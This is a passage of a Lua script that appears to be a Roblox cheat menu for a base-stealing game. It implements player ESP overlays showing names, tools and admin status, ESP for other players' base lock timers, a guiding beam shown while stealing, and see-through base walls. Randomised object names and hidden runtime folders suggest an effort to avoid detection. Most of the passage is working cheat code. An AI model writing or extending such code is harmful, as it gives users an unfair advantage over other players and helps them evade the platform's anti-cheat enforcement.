			if currentCamera then
				list50[#list50 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func387)
			end

			for _, player in ipairs(Players:GetPlayers()) do
				func384(player)
			end

			task.spawn(function()
				while flag241 and n14 == value276 do
					task.wait(0.2)

					if flag241 and n14 == value276 then
						func385()
					end
				end
			end)
		end

		bindableEvent.Event:Connect(func386)
		screenGui.Destroying:Connect(func386)

		obj72:CreateToggle({
			Name = "Player ESP",
			Default = true,
			Callback = function(value)
				if value then
					func389()
				else
					func386()
				end
			end,
		})

		obj72:CreateMultiDropdown({
			Name = "Show Information",
			Note = "Choose what Player ESP shows. Username replaces the display name.",
			Options = { "Name", "Username", "Avatar", "Tool", "Brainrot", "Admin Panel" },
			Default = { "Name", "Tool", "Brainrot", "Admin Panel" },
			Callback = function(value)
				local tbl78 = {
					Name = false,
					Username = false,
					Avatar = false,
					Tool = false,
					Brainrot = false,
					["Admin Panel"] = false,
				}

				if type(value) == "table" then
					for k, value277 in pairs(value) do
						if type(value277) == "string" and tbl78[value277] ~= nil then
							tbl78[value277] = true
						elseif type(k) == "string" and value277 == true and tbl78[k] ~= nil then
							tbl78[k] = true
						end
					end
				end

				tbl71 = tbl78
				func388()
			end,
		})

		obj72:CreateSlider({
			Name = "ESP Size",
			Min = 50,
			Max = 200,
			Default = 100,
			AllowDecimals = false,
			Increment = 1,
			Unit = "%",
			Callback = function(value)
				n13 = math.clamp((tonumber(value) or 100) / 100, 0.5, 2)
				func387()
			end,
		})
	end

	do
		local chilliBaseLockTimerRuntime, value278 = func245("__ChilliBaseLockTimerRuntime")
		local flag255 = false
		n = 1
		local value279 = nil
		local folder = nil
		local tbl79 = {}
		local list61 = {}
		local color = Color3.fromRGB(255, 58, 74)
		local color2 = Color3.fromRGB(154, 255, 62)
		local colorSequence2 = ColorSequence.new
		local value280 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
		local value281 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(222, 222, 222))
		local tbl80 = { value280, value281 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
			table.move(values, 1, values.n, 3, tbl80)
		end

		local value282 = colorSequence2(tbl80)

		local function func390()
			local currentCamera = Workspace.CurrentCamera
			local n15 = math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.064, 52, 76))
			return math.floor(n15 * 2.8), n15
		end

		local function func391(flag256)
			if not flag256.Tag or not flag256.Tag.Gui or not flag256.Tag.Gui.Parent then
				return
			end
			local num40, num41 = func390()
			flag256.Tag.Gui.Size = UDim2.fromOffset(math.floor(num40 * n + 0.5), math.floor(num41 * n + 0.5))
		end

		local function createPart(param111)
			local flag257 = func340(param111)
			if not flag257 then
				return nil
			end
			local part = Instance.new("Part")
			part.Name = func1()
			part.Size = Vector3.one
			part.Transparency = 1
			part.Anchored = true
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CastShadow = false
			part.Position = flag257
			part.Parent = folder
			return part
		end

		local function func392(param112)
			local part20 = createPart(param112)
			if not part20 then
				return nil
			end
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "BaseLockTimer"
			billboardGui.Adornee = part20
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = 2500
			billboardGui.Parent = chilliBaseLockTimerRuntime
			local frame = Instance.new("Frame")
			frame.Name = "Frame"
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Status"
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			textLabel.Position = UDim2.fromScale(0.02, 0)
			textLabel.Size = UDim2.fromScale(0.96, 0.53)
			textLabel.Text = "Open"
			textLabel.TextColor3 = color2
			textLabel.TextScaled = true
			textLabel.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			textLabel.TextStrokeTransparency = 0
			textLabel.Parent = frame
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = "TextOutline"
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.Color = textLabel.TextStrokeColor3
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Thickness = 2.1
			uiStroke.Transparency = 0
			uiStroke.Parent = textLabel
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Name = "Sheen"
			uiGradient.Color = value282
			uiGradient.Rotation = 90
			uiGradient.Parent = textLabel
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Name = "Timer"
			textLabel2.BackgroundTransparency = 1
			textLabel2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			textLabel2.Position = UDim2.fromScale(0.02, 0.43)
			textLabel2.Size = UDim2.fromScale(0.96, 0.57)
			textLabel2.Text = ""
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel2.TextScaled = true
			textLabel2.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			textLabel2.TextStrokeTransparency = 0
			textLabel2.Visible = false
			textLabel2.Parent = frame
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Name = "Sheen"
			uiGradient2.Color = value282
			uiGradient2.Rotation = 90
			uiGradient2.Parent = textLabel2
			local uiStroke2 = Instance.new("UIStroke")
			uiStroke2.Name = "TextOutline"
			uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke2.Color = textLabel2.TextStrokeColor3
			uiStroke2.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke2.Thickness = 2.1
			uiStroke2.Transparency = 0.05
			uiStroke2.Parent = textLabel2

			return {
				Gui = billboardGui,
				Anchor = part20,
				Status = textLabel,
				StatusStroke = uiStroke,
				Timer = textLabel2,
				TimerStroke = uiStroke2,
				StatusStyleSource = nil,
				TimerStyleSource = nil,
				StatusMode = nil,
			}
		end

		local function func393(param113, param114, instance58, textColor3)
			if instance58 and instance58:IsA("TextLabel") then
				param113.FontFace = instance58.FontFace
				param113.TextColor3 = instance58.TextColor3
				param113.TextStrokeColor3 = instance58.TextStrokeColor3
				param113.TextStrokeTransparency = instance58.TextStrokeTransparency
			else
				param113.TextColor3 = textColor3
			end

			param114.Color = param113.TextStrokeColor3
			param114.Transparency = math.clamp(param113.TextStrokeTransparency * 0.35, 0, 0.35)
		end

		local function func394(flag258)
			local str25 = tostring(flag258 or "")
			local n15 = tonumber(str25:match("(%d+)%s*[mM]")) or 0
			local num42 = tonumber(str25:match("(%d+)%s*[sS]"))

			if num42 == nil and n15 == 0 then
				num42 = tonumber(str25:match("%d+")) or 0
			end

			return n15 * 60 + (num42 or 0)
		end

		local function func395(list62)
			if not flag255 or not list62.Tag then
				return
			end
			local anchor = list62.Tag.Anchor
			if not anchor or not anchor.Parent then
				list62.Tag.Gui.Enabled = false
				return
			end
			local base2 = func340(list62.Base)

			if base2 and anchor.Position ~= base2 then
				anchor.Position = base2
			end

			local value283 = nil
			local value284 = nil
			local flag259 = false
			local n15 = -1
			local value285 = nil
			local value286 = nil

			for _, timerLabel in ipairs(list62.TimerLabels) do
				if timerLabel.Parent then
					local locked = timerLabel.Parent:FindFirstChild("Locked")
					local open = timerLabel.Parent:FindFirstChild("Open") or timerLabel.Parent:FindFirstChild("Unlocked")

					if not value283 and locked and locked:IsA("TextLabel") then
						value283 = locked
					end

					if not value284 and open and open:IsA("TextLabel") then
						value284 = open
					end

					if timerLabel.Visible or locked and locked:IsA("GuiObject") and locked.Visible then
						local str26 = tostring(timerLabel.Text or "")
						local value287 = func394(str26)
						flag259 = true
						local flag260 = true

						if not (n15 < value287) then
							flag259 = flag260
						else
							n15 = value287
							value285 = str26
							value286 = timerLabel
						end
					end
				end
			end

			list62.Tag.Gui.Enabled = not string.find(string.lower(func339(list62.Base)), "empty base", 1, true)
			if not list62.Tag.Gui.Enabled then
				return
			end

			if flag259 then
				list62.Tag.Status.Position = UDim2.fromScale(0.02, 0)
				list62.Tag.Status.Size = UDim2.fromScale(0.96, 0.53)
				list62.Tag.Status.Text = "Locked:"
				list62.Tag.Timer.Text = value285 or ""
				list62.Tag.Timer.Visible = value285 ~= nil and value285 ~= ""

				if list62.Tag.StatusMode ~= "Locked" or list62.Tag.StatusStyleSource ~= value283 then
					list62.Tag.StatusMode = "Locked"
					list62.Tag.StatusStyleSource = value283
					func393(list62.Tag.Status, list62.Tag.StatusStroke, value283, color)
				end

				if list62.Tag.TimerStyleSource ~= value286 then
					list62.Tag.TimerStyleSource = value286
					func393(list62.Tag.Timer, list62.Tag.TimerStroke, value286, Color3.fromRGB(255, 255, 255))
				end
			else
				list62.Tag.Status.Position = UDim2.fromScale(0.08, 0.15)
				list62.Tag.Status.Size = UDim2.fromScale(0.84, 0.7)
				list62.Tag.Status.Text = "Open"
				list62.Tag.Timer.Text = ""
				list62.Tag.Timer.Visible = false
				value284 = value284 or value283

				if list62.Tag.StatusMode ~= "Open" or list62.Tag.StatusStyleSource ~= value284 then
					list62.Tag.StatusMode = "Open"
					list62.Tag.StatusStyleSource = value284
					func393(list62.Tag.Status, list62.Tag.StatusStroke, value284, color2)
					list62.Tag.Status.TextColor3 = color2
				end
			end
		end

		local function func396(list63)
			func246(list63.TimerConnections)
			table.clear(list63.TimerLabels)
			if not list63.Base.Parent then
				return
			end

			for _, descendant in ipairs(list63.Base:GetDescendants()) do
				if descendant:IsA("TextLabel") and descendant.Name == "RemainingTime" then
					list63.TimerLabels[#list63.TimerLabels + 1] = descendant

					list63.TimerConnections[#list63.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Text"):Connect(function()
						func395(list63)
					end)

					list63.TimerConnections[#list63.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Visible"):Connect(function()
						func395(list63)
					end)

					local locked = descendant.Parent and descendant.Parent:FindFirstChild("Locked")

					if locked and locked:IsA("GuiObject") then
						list63.TimerConnections[#list63.TimerConnections + 1] = locked:GetPropertyChangedSignal("Visible"):Connect(function()
							func395(list63)
						end)
					end
				end
			end

			func395(list63)
		end

		local function func397(child)
			local entry22 = tbl79[child]
			if not entry22 then
				return
			end
			func246(entry22.Connections)
			func246(entry22.TimerConnections)

			if entry22.Tag and entry22.Tag.Gui then
				entry22.Tag.Gui:Destroy()
			end

			if entry22.Tag and entry22.Tag.Anchor then
				entry22.Tag.Anchor:Destroy()
			end

			tbl79[child] = nil
		end

		local function func398(child)
			if not flag255 or not child:IsA("Model") or tbl79[child] then
				return
			end
			local flag261 = func392(child)
			if not flag261 then
				return
			end

			local tbl81 = {
				Base = child,
				Tag = flag261,
				TimerLabels = {},
				Connections = {},
				TimerConnections = {},
				RefreshPending = false,
			}

			tbl79[child] = tbl81
			func391(tbl81)

			local function func399(descendant)
				if descendant and descendant.Name ~= "RemainingTime" and descendant.Name ~= "Locked" and not func341(descendant) then
					return
				end

				if tbl81.RefreshPending then
					return
				end
				tbl81.RefreshPending = true

				task.defer(function()
					tbl81.RefreshPending = false

					if flag255 and tbl79[child] == tbl81 then
						func396(tbl81)
					end
				end)
			end

			tbl81.Connections[#tbl81.Connections + 1] = child.DescendantAdded:Connect(func399)
			tbl81.Connections[#tbl81.Connections + 1] = child.DescendantRemoving:Connect(func399)

			tbl81.Connections[#tbl81.Connections + 1] = child.Destroying:Connect(function()
				func397(child)
			end)

			local obj83 = func248(child)

			if obj83 then
				tbl81.Connections[#tbl81.Connections + 1] = obj83:GetPropertyChangedSignal("Text"):Connect(function()
					func395(tbl81)
				end)
			end

			func396(tbl81)
		end

		func253 = function()
			for _, value288 in pairs(tbl79) do
				func391(value288)
			end
		end

		func254 = function()
			flag255 = false
			func246(list61)
			local list64 = {}

			for k in pairs(tbl79) do
				list64[#list64 + 1] = k
			end

			for _, item62 in ipairs(list64) do
				func397(item62)
			end

			if folder then
				folder:Destroy()
				folder = nil
			end

			value279 = nil
		end

		local function func400(instance59)
			value279 = instance59
			list61[#list61 + 1] = instance59.ChildAdded:Connect(func398)
			list61[#list61 + 1] = instance59.ChildRemoved:Connect(func397)

			list61[#list61 + 1] = instance59.DescendantAdded:Connect(function(descendant)
				if not func341(descendant) then
					return
				end
				local parent = descendant.Parent

				if parent and parent.Parent == instance59 then
					func398(parent)
				end
			end)

			for _, child in ipairs(instance59:GetChildren()) do
				func398(child)
			end
		end

		func255 = function()
			func254()
			flag255 = true
			folder = Instance.new("Folder")
			folder.Name = func1()
			folder.Archivable = false
			folder.Parent = Workspace
			local currentCamera = Workspace.CurrentCamera

			if currentCamera then
				list61[#list61 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func253)
			end

			list61[#list61 + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(func253)
			local plots = Workspace:FindFirstChild("Plots")

			if plots then
				func400(plots)
			else
				list61[#list61 + 1] = Workspace.ChildAdded:Connect(function(child)
					if flag255 and child.Name == "Plots" then
						func400(child)
					end
				end)
			end
		end

		value278.Event:Connect(func254)
		chilliBaseLockTimerRuntime.Destroying:Connect(func254)
	end
end

local chilliBrainrotESPRuntime, value289, byName4, flag262, list65, tbl82, n2, flag263, flag264, n3
local flag265, tbl83, func401, func402, func403, func404, func405, func406, func407, func408
local attachment, flag266, flag267, func409, func410, func411, func412, n4, func413, func414

do
	local value290 = obj55:CreateToggle({
		Name = "Timer ESP",
		Default = true,
		Callback = function(value)
			if value then
				func255()
			else
				func254()
			end
		end,
	})

	obj55:CreateSlider({
		Name = "Timer ESP Size",
		Min = 50,
		Max = 200,
		Default = 80,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = value290,
		ShowWhen = value290,
		Callback = function(value)
			n = math.clamp((tonumber(value) or 100) / 100, 0.5, 2)
			func253()
		end,
	})

	local chilliYourBaseESPRuntime, value291
	chilliYourBaseESPRuntime, value291 = func245("__ChilliYourBaseESPRuntime")
	local fillTransparency
	fillTransparency = 0.45
	local color
	color = Color3.fromRGB(255, 255, 255)
	local flag268, flag269, flag270, obj84, flag271, highlight, attachment2, attachment3, beam, beam2
	local flag272, flag273, flag274, list66, list67

	do
		local byName5 = {
			AnimalPodiums = true,
			Unlock = true,
			PlotSign = true,
			Purchases = true,
			Conveyor = true,
			Walls = true,
			Wall = true,
			Floors = true,
			Floor = true,
			Roof = true,
			Decorations = true,
			Model = true,
			Laser = true,
			LaserHitbox = true,
			InvisibleWalls = true,
			Spawn = true,
		}

		flag268 = false
		flag269 = false
		flag270 = false
		obj84 = nil
		flag271 = nil
		highlight = nil
		attachment2 = nil
		attachment3 = nil
		beam = nil
		beam2 = nil
		local value292 = nil
		local value293 = nil
		local n5 = 0.5
		flag272 = { Part = nil, Base = nil, Dirty = true, NextLookup = 0 }
		flag273 = false
		flag274 = false
		local tbl84 = {}
		local n6 = 0
		local tbl85 = {}
		local obj2 = setmetatable({}, { __mode = "k" })
		list66 = {}
		list67 = {}
		local connection = nil

		local function func415(instance60, param115)
			local entry23 = obj2[instance60]
			if entry23 ~= nil then
				return entry23
			end
			local flag275 = false

			if not byName5[instance60.Name] then
				if instance60.Parent == param115 then
					flag275 = true
				elseif instance60:FindFirstChildOfClass("Humanoid") or instance60:FindFirstChildOfClass("AnimationController") or instance60:GetAttribute("Mutation") ~= nil then
					flag275 = true
				end
			end

			if flag275 or #instance60:GetChildren() > 0 then
				obj2[instance60] = flag275
			end

			return flag275
		end

		local function func416(instance61, param116)
			if not instance61:IsA("BasePart") or instance61.Transparency >= 1 then
				return false
			end

			if instance61.Name == "PlotSign" then
				return false
			end

			for _, child in ipairs(instance61:GetChildren()) do
				if child:IsA("SurfaceGui") or child:IsA("BillboardGui") or child:IsA("Decal") or child:IsA("Texture") then
					return false
				end
			end

			while instance61 and instance61 ~= param116 do
				if instance61:IsA("Model") and func415(instance61, param116) then
					return false
				end
				instance61 = instance61.Parent
			end

			return instance61 == param116
		end

		local function func417(param117, param118)
			if tbl85[param117] ~= nil or not func416(param117, param118) or #tbl84 == 0 then
				return
			end
			n6 += 1
			local entry24 = tbl84[(n6 - 1) % #tbl84 + 1]
			local color2 = param117.Color
			tbl85[param117] = color2
			param117.Color = color2:Lerp(entry24, 0.78)
		end

		local function func418()
			for k, value294 in pairs(tbl85) do
				if k.Parent then
					pcall(function()
						k.Color = value294
					end)
				end
			end

			table.clear(tbl85)
			table.clear(obj2)
			table.clear(tbl84)
			n6 = 0
			flag274 = false
		end

		local function func419(instance62)
			func418()
			if not instance62 or not instance62.Parent then
				return
			end
			tbl84 = func252("Phantom")

			for _, descendant in ipairs(instance62:GetDescendants()) do
				func417(descendant, instance62)
			end

			flag274 = true
		end

		local function func420(instance63)
			for _, descendant in ipairs(instance63:GetDescendants()) do
				local isTextLabel = descendant:IsA("TextLabel")

				if isTextLabel then
					isTextLabel = string.find(string.lower(tostring(descendant.Text or "")), "collect", 1, true)
				end

				if isTextLabel then
					local parent = descendant.Parent

					while parent and parent ~= instance63 do
						if parent:IsA("BasePart") then
							return parent
						end
						parent = parent.Parent
					end
				end
			end

			local cashPad = instance63:FindFirstChild("CashPad") or instance63:FindFirstChild("Cash")
			return cashPad and cashPad:FindFirstChildWhichIsA("BasePart", true) or nil
		end

		local function func421(instance64, param119)
			while instance64 and instance64 ~= param119 do
				local lowered8 = string.lower(instance64.Name):gsub("[^%w]", "")
				local flag276 = lowered8 == "cashpad" or lowered8 == "cash" or string.find(lowered8, "collect", 1, true)

				if not flag276 then
					flag276 = instance64:IsA("TextLabel")

					if flag276 then
						flag276 = string.find(string.lower(tostring(instance64.Text or "")), "collect", 1, true)
					end
				end

				if flag276 then
					return true
				end
				instance64 = instance64.Parent
			end

			return false
		end

		local function func422()
			if attachment2 then
				attachment2:Destroy()
			end

			if attachment3 then
				attachment3:Destroy()
			end

			attachment2 = nil
			attachment3 = nil
			beam = nil
			beam2 = nil
			value292 = nil
			value293 = nil
		end

		local function func423(num43)
			local flag277 = flag271
			if not flag277 then
				return nil
			end
			local part = flag272.Part

			if flag272.Base ~= flag277 or part and not part.Parent then
				flag272.Dirty = true
			end

			if part and part.Parent and not flag272.Dirty then
				return part
			end

			if not flag272.Dirty and num43 < flag272.NextLookup then
				return nil
			end
			local value295 = func420(flag277)
			flag272.Part = value295
			flag272.Base = flag277
			flag272.Dirty = false
			flag272.NextLookup = num43 + n5
			return value295
		end

		local function func424(parent, parent2)
			func422()
			attachment2 = Instance.new("Attachment")
			attachment2.Name = func1()
			attachment2.Archivable = false
			attachment2.Position = Vector3.zero
			attachment2.Parent = parent
			attachment3 = Instance.new("Attachment")
			attachment3.Name = func1()
			attachment3.Archivable = false
			attachment3.Position = Vector3.new(0, parent2.Size.Y * 0.5 + 5, 0)
			attachment3.Parent = parent2
			beam2 = Instance.new("Beam")
			beam2.Name = func1()
			beam2.Archivable = false
			beam2.Attachment0 = attachment2
			beam2.Attachment1 = attachment3
			beam2.FaceCamera = true
			beam2.Width0 = 0.38
			beam2.Width1 = 0.56
			beam2.Segments = 20
			beam2.CurveSize0 = 1.8
			beam2.CurveSize1 = -1.8
			beam2.LightEmission = 1
			beam2.Color = ColorSequence.new(Color3.fromRGB(20, 145, 255), Color3.fromRGB(90, 240, 255))
			beam2.Transparency = NumberSequence.new(0.72)
			beam = Instance.new("Beam")
			beam.Name = func1()
			beam.Archivable = false
			beam.Attachment0 = attachment2
			beam.Attachment1 = attachment3
			beam.FaceCamera = true
			beam.Width0 = 0.09
			beam.Width1 = 0.18
			beam.Segments = 20
			beam.CurveSize0 = 1.8
			beam.CurveSize1 = -1.8
			beam.LightEmission = 1
			local value296 = beam
			local colorSequence = ColorSequence.new
			local value297 = ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 205, 255))
			local value298 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(225, 255, 255))
			local new = ColorSequenceKeypoint.new
			local color2 = Color3.fromRGB
			local tbl86 = { value297, value298 }

			do
				local values = table.pack(new(1, color2(70, 165, 255)))
				table.move(values, 1, values.n, 3, tbl86)
			end

			value296.Color = colorSequence(tbl86)
			beam.Transparency = NumberSequence.new(0.04)
			obj[beam2] = true
			obj[beam] = true
			local flag278 = obj9:NextInteger(0, 1) == 0
			beam2.Parent = flag278 and attachment2 or attachment3
			beam.Parent = flag278 and attachment3 or attachment2
			value292 = parent
			value293 = parent2
		end

		local function func425()
			if not (flag268 and flag270) then
				if attachment2 then
					func422()
				end

				return
			end

			local flag279 = localPlayer:GetAttribute("Stealing") == true and flag271 ~= nil and func247()
			local value299 = flag279 and func423(os.clock())

			if not (flag279 and value299) then
				if attachment2 then
					func422()
				end
			else
				local flag280 = value292 ~= flag279 or value293 ~= value299

				if not flag280 then
					flag280 = not (attachment2 and attachment2.Parent)
				end

				if not flag280 then
					flag280 = not (attachment3 and attachment3.Parent)
				end

				if not flag280 then
					flag280 = not (beam and beam.Parent)
				end

				if not flag280 then
					flag280 = not (beam2 and beam2.Parent)
				end

				if flag280 then
					func424(flag279, value299)
				end
			end
		end

		local function func426()
			local flag281 = flag268 and flag271 ~= nil and localPlayer:GetAttribute("Stealing") == true
			local flag282 = flag281 and flag269
			flag281 = flag281 and flag270

			if flag282 and not flag274 then
				func419(flag271)
			elseif not flag282 and flag274 then
				func418()
			end

			if highlight and highlight.Parent then
				highlight.Enabled = flag282
			end

			func251("UnfadedPlot", (flag282 or flag281) and flag271 or nil)
		end

		local function func427()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			func422()
			func418()

			if highlight then
				highlight:Destroy()
				highlight = nil
			end

			flag271 = nil
			func426()
		end

		local function func428(adornee)
			flag271 = adornee
			highlight = Instance.new("Highlight")
			highlight.Name = "YourBaseHighlight"
			highlight.Adornee = adornee
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.FillTransparency = fillTransparency
			highlight.OutlineTransparency = 0
			highlight.Parent = chilliYourBaseESPRuntime
			local value300 = func252("Phantom")[1] or color
			highlight.FillColor = value300
			highlight.OutlineColor = value300

			connection = adornee.DescendantAdded:Connect(function(descendant)
				if flag268 and flag271 == adornee then
					if flag274 then
						func417(descendant, adornee)
					end

					if not (flag272.Part and flag272.Part.Parent) and func421(descendant, adornee) then
						flag272.Dirty = true
					end
				end
			end)

			func426()
		end

		local function func429()
			if not obj84 then
				return nil
			end

			for _, child in ipairs(obj84:GetChildren()) do
				if child:IsA("Model") and func249(child) then
					return child
				end
			end

			return nil
		end

		local function func430()
			flag273 = false
			if not flag268 then
				return
			end
			local result26 = func429()
			if result26 == flag271 and highlight and highlight.Parent then
				func426()
				return
			end
			func427()

			if result26 then
				func428(result26)
			end
		end

		local function func431()
			if flag273 then
				return
			end
			flag273 = true
			task.defer(func430)
		end

		local function func432()
			func246(list67)
			if not obj84 then
				return
			end

			for _, child in ipairs(obj84:GetChildren()) do
				local obj85 = func248(child)

				if obj85 then
					list67[#list67 + 1] = obj85:GetPropertyChangedSignal("Text"):Connect(func431)
				end
			end
		end

		local function func433()
			if not flag268 then
				return
			end
			func432()
			func431()
		end

		local function func434(param120)
			obj84 = param120

			list66[#list66 + 1] = param120.ChildAdded:Connect(function()
				task.defer(func433)
			end)

			list66[#list66 + 1] = param120.ChildRemoved:Connect(function()
				task.defer(func433)
			end)

			list66[#list66 + 1] = param120.DescendantAdded:Connect(function(descendant)
				if descendant:IsA("TextLabel") then
					task.defer(func433)
				end
			end)

			func432()
			func430()
		end

		local function func435()
			flag268 = false
			flag273 = false
			func246(list66)
			func246(list67)
			func427()
			obj84 = nil
		end

		local function func436()
			func435()
			flag268 = true
			list66[#list66 + 1] = RunService.RenderStepped:Connect(func425)
			list66[#list66 + 1] = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(func426)

			list66[#list66 + 1] = localPlayer.CharacterAdded:Connect(function(character_)
				task.spawn(function()
					character_:WaitForChild("HumanoidRootPart", 5)

					if flag268 and character_ == localPlayer.Character then
						func422()
						func426()
					end
				end)
			end)

			local plots = Workspace:FindFirstChild("Plots")

			if plots then
				func434(plots)
			else
				list66[#list66 + 1] = Workspace.ChildAdded:Connect(function(child)
					if flag268 and child.Name == "Plots" then
						func434(child)
					end
				end)
			end
		end

		local function func437()
			local value301 = flag269
			local flag283

			if flag269 then
				flag283 = value301
			else
				flag283 = flag270
			end

			if flag283 and not flag268 then
				func436()
			elseif not flag283 and flag268 then
				func435()
			elseif flag283 then
				func426()
			end
		end

		value291.Event:Connect(func435)
		chilliYourBaseESPRuntime.Destroying:Connect(func435)

		obj55:CreateToggle({
			Name = "Your Base ESP (While Stealing)",
			Default = false,
			Callback = function(value)
				flag269 = value == true
				func437()
			end,
		})

		obj55:CreateToggle({
			Name = "Beam to Your Base (While Stealing)",
			Default = true,
			Callback = function(value)
				flag270 = value == true
				func437()
			end,
		})
	end

	obj55:CreateSlider({
		Name = "Base Transparency",
		Min = 0,
		Max = 100,
		Default = 80,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		ShowWhen = obj55:CreateToggle({
			Name = "Clear Base",
			Default = false,
			Callback = function(value)
				func251("YourBaseClear", value == true)
			end,
		}),
		Note = "Adjusts base visibility: 0% keeps the original look and 100% makes it invisible.",
		Callback = function(value)
			func251("ClearBaseTransparency", math.clamp(tonumber(value) or 80, 0, 100) / 100)
		end,
	})

	local n5
	n5 = math.clamp(tonumber(tbl43.ClearBaseTransparency) or 0.8, 0, 1)
	local n6
	n6 = 0.0015
	local folder, bindableEvent, flag284, n7, plots, connection, connection2

	do
		local byName6 = {
			AnimalPodiums = true,
			Unlock = true,
			PlotSign = true,
			Purchases = true,
			Conveyor = true,
			Walls = true,
			Wall = true,
			Floors = true,
			Floor = true,
			Roof = true,
			Decorations = true,
		}

		local result27 = func244()
		local tbl87 = {}

		for _, item63 in ipairs({ result27, CoreGui }) do
			if item63 and not tbl87[item63] then
				tbl87[item63] = true
				local chilliFadePlotsRuntime = item63:FindFirstChild("__ChilliFadePlotsRuntime")

				if chilliFadePlotsRuntime then
					local cleanup = chilliFadePlotsRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliFadePlotsRuntime:Destroy()
					end)
				end
			end
		end

		folder = Instance.new("Folder")
		folder.Name = "__ChilliFadePlotsRuntime"
		folder.Archivable = false
		folder.Parent = result27
		bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = folder
		flag284 = false
		n7 = 0
		plots = nil
		connection = nil
		connection2 = nil
		local obj86 = Random.new()
		local tbl88 = {}
		local n8 = 0
		local flag285 = false
		local value302 = nil
		local tbl89 = {}
		local obj2 = setmetatable({}, { __mode = "k" })

		local function func438(instance65)
			while instance65 do
				local parent = instance65.Parent
				if parent == plots then
					return instance65
				end

				if not parent or parent == Workspace then
					return nil
				end
				instance65 = parent
			end

			return nil
		end

		local function func439(instance66, param121)
			local entry25 = obj2[instance66]
			if entry25 ~= nil then
				return entry25
			end
			local flag286 = false

			if not byName6[instance66.Name] then
				if instance66.Parent == param121 then
					flag286 = true
				elseif instance66:FindFirstChildOfClass("Humanoid") or instance66:FindFirstChildOfClass("AnimationController") then
					flag286 = true
				end
			end

			if flag286 or #instance66:GetChildren() > 0 then
				obj2[instance66] = flag286
			end

			return flag286
		end

		local function func440(instance67, param122)
			while instance67 and instance67 ~= param122 do
				if instance67:IsA("Model") and func439(instance67, param122) then
					return true
				end
				instance67 = instance67.Parent
			end

			return false
		end

		local function func441(instance68)
			if tbl89[instance68] ~= nil then
				return
			end

			if not instance68:IsA("BasePart") then
				return
			end

			if instance68.Transparency >= 1 then
				return
			end
			local flag287 = func438(instance68)
			if not flag287 or flag287 == value302 or func440(instance68, flag287) then
				return
			end
			local localTransparencyModifier = instance68.LocalTransparencyModifier

			if math.abs(localTransparencyModifier - n5) <= 0.001 then
				localTransparencyModifier = 0
			end

			tbl89[instance68] = localTransparencyModifier

			pcall(function()
				instance68.LocalTransparencyModifier = math.max(localTransparencyModifier, n5)
			end)
		end

		local function func442()
			for k, value303 in pairs(tbl89) do
				pcall(function()
					k.LocalTransparencyModifier = value303
				end)
			end

			table.clear(tbl89)
			table.clear(obj2)
			table.clear(tbl88)
			n8 = 0
			flag285 = false
		end

		local function func443(param123)
			for k, value304 in pairs(tbl89) do
				if func438(k) == param123 then
					pcall(function()
						k.LocalTransparencyModifier = value304
					end)

					tbl89[k] = nil
				end
			end
		end

		local function func444(instance69)
			if not instance69 or not instance69.Parent then
				return
			end

			for _, descendant in ipairs(instance69:GetDescendants()) do
				func441(descendant)
			end
		end

		local function func445(param124)
			if value302 == param124 then
				return
			end
			local value305 = value302
			value302 = param124
			if not flag284 then
				return
			end

			if param124 then
				func443(param124)
			end

			if value305 then
				func444(value305)
			end
		end

		local function func446(param125)
			n5 = math.clamp(tonumber(param125) or 0.8, 0, 1)
			if not flag284 then
				return
			end

			for k, value306 in pairs(tbl89) do
				if k.Parent then
					pcall(function()
						k.LocalTransparencyModifier = math.max(value306, n5)
					end)
				else
					tbl89[k] = nil
				end
			end
		end

		func250(function(flag288, flag289)
			if flag288 == "UnfadedPlot" then
				local func447 = func445
				flag289 = typeof(flag289) == "Instance" and flag289
				func447(flag289 or nil)
			elseif flag288 == "ClearBaseTransparency" then
				func446(flag289)
			end
		end)

		local function func448(param126)
			n8 += 1
			tbl88[n8] = param126
			if flag285 then
				return
			end
			flag285 = true
			local flag290 = n7

			task.delay(obj86:NextNumber(0.18, 0.42), function()
